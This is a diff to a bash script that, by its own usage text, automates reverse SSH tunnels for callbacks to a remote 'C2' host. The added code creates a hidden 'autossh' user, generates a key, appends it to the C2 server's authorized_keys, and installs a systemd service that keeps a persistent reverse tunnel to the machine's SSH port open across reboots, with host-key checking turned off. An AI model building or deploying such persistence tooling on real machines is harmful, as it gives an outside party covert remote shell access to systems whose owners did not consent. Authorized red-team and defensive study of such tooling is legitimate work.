@@ -15,7 +15,8 @@ set -e
 
 bold=$(tput bold)
 normal=$(tput sgr0)
-
+AWS=0
+AUTOSSH=0
 
 USAGE="
 A bash script to automate reverse reverse ssh tunnels. Handy for callbacks
@@ -41,12 +42,15 @@ fi
 
 
 # Set flags.
-while getopts "ahk:c:u:l:" FLAG
+while getopts "ashk:c:u:l:" FLAG
 do
 	case $FLAG in
 		a)
 			AWS=1
 			;;
+        s)
+            AUTOSSH=1
+            ;;
 		k)
 			KEY="$OPTARG"
 			;;
@@ -83,6 +87,10 @@ elif [ -z ${HOST+x} ]; then
 	echo "Remote C2 hostname (-c) is not set."
 	echo "$USAGE"
 	exit
+elif [ -f ${KEY+x} ]; then
+	echo "Remote C2 ssh key (-k) was not provided."
+	echo "$USAGE"
+	exit
 fi
 
 
@@ -93,13 +101,13 @@ if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
     printf "\n"
 
 
-# Installing deps
+# Installing deps - ssh
 if (systemctl -q is-active sshd.service)
 then
     echo "${bold}### SSH is Installed And Running! ###"
     printf "\n"
 else
-    echo "${bold}### Installing Dependencies ###"
+    echo "${bold}### Installing SSH Dependencies ###"
     sudo apt update && sudo apt upgrade
     sudo apt install openssh-server
     printf "\n"
@@ -160,6 +168,125 @@ if [ ${AWS} -eq 1 ]; then
 # Finishing script
     echo "${bold}### Donezo! Please reboot the machine. ###"
     exit
+
+########################################################
+# Autossh selection                                    #
+########################################################
+
+elif [ ${AUTOSSH} -eq 1 ]; then
+
+# Installing deps - autossh
+if (systemctl -q is-active autossh.service)
+then
+    echo "${bold}### AutoSSH is Installed And Running! ###"
+    printf "\n"
+else
+    echo "${bold}### Installing AutoSSH Dependencies ###"
+    sudo apt update && sudo apt upgrade
+    sudo apt install autossh
+    printf "\n"
+    # echo "${bold}### Starting AutoSSH Service & Enabling On Reboot ###"
+    # sudo systemctl start autossh && sudo systemctl enable autossh
+fi
+    printf "\n"
+
+
+# Verify if user 'autossh' exists
+if id "autossh" &>/dev/null; then
+    echo "${bold}### User 'autossh' found ###"
+    # sed -i "s/home\/autossh:\/bin\/bash/var\/run\/autossh:\/bin\/false/g" /etc/passwd
+else
+    echo "${bold}### Creating user 'autossh'###"
+    useradd autossh -s /bin/false -b /var/run
+fi
+
+
+# create tmp folder for configuration
+if [ ! -d "/var/run/autossh" ]; then
+    mkdir /var/run/autossh
+else
+    rm -rf /var/run/autossh/* /var/run/autossh/.[a-zA-Z0-9]*
+fi
+mkdir /var/run/autossh/.ssh
+touch /var/run/autossh/.ssh/known_hosts
+chown -R autossh:autossh /var/run/autossh
+
+
+# create tunnel folder for persistence
+if [ ! -d "/etc/tunnel" ]; then
+    mkdir /etc/tunnel
+else
+    rm -rf /etc/tunnel/* /etc/tunnel/.[a-zA-Z0-9]*
+fi
+chown autossh:autossh /etc/tunnel
+chmod 700 /etc/tunnel
+
+
+# Generate ssh key in localhost
+### Test this block
+echo "${bold}### Creating new SSH key: /var/run/autossh/.ssh/id_rsa! ###"
+ssh-keygen -t rsa -b 4096 -f /var/run/autossh/.ssh/id_rsa
+cat /var/run/autossh/.ssh/id_rsa.pub | ssh -i ${KEY} ${USERC2}@${HOST} 'cat >> ~/.ssh/authorized_keys'
+printf "\n"
+
+# Copy ssh key ti tunnel folder and verify ownership
+chown -R autossh:autossh /var/run/autossh
+cp -Rp /var/run/autossh/.ssh /etc/tunnel
+chmod -R 700 /etc/tunnel
+chgrp -R autossh /etc/tunnel/.ssh
+
+
+# Create Autossh configuration files
+echo "${bold}### Creating autossh configuration files ###"
+cat > /etc/default/autossh <<____HERE
+##############################################
+#Specifies how long ssh must be up before we
+#consider it a successful connection
+AUTOSSH_GATETIME=0
+#Sets the connection monitoring port.
+#A value of 0 turns the monitoring function off.
+AUTOSSH_PORT=0
+AUTOSSH_LOGLEVEL=7
+AUTOSSH_LOGFILE=/var/run/autossh/user_ssh_error.out
+SSH_OPTIONS="-N -o 'ServerAliveInterval 60' -o 'ServerAliveCountMax 3' -o 'StrictHostKeyChecking=no' -p 22 -R 20028:localhost:22 ${USERC2}@${HOST} -i  /etc/tunnel/.ssh/id_rsa"
+###########################################
+____HERE
+
+cat > /lib/systemd/system/autossh.service <<HEREDOC
+#############################################
+[Unit]
+Description=autossh
+Wants=network-online.target
+After=network-online.target
+
+[Service]
+#Type=simple
+User=autossh
+EnvironmentFile=/etc/default/autossh
+ExecStart=/usr/bin/autossh \$SSH_OPTIONS
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+#################################################
+HEREDOC
+
+ln -sf /lib/systemd/system/autossh.service /etc/systemd/system/autossh.service
+
+cat > /usr/lib/tmpfiles.d/autossh.conf << HEREDOC
+#########################################
+d /var/run/autossh 0700 autossh autossh
+L /var/run/autossh/.ssh - - - - /etc/tunnel/.ssh
+##############################################
+HEREDOC
+
+
+# Complete configuration
+systemctl daemon-reload
+systemctl enable autossh
+systemctl start autossh
+
 
 else
 # Transferring local key to C2
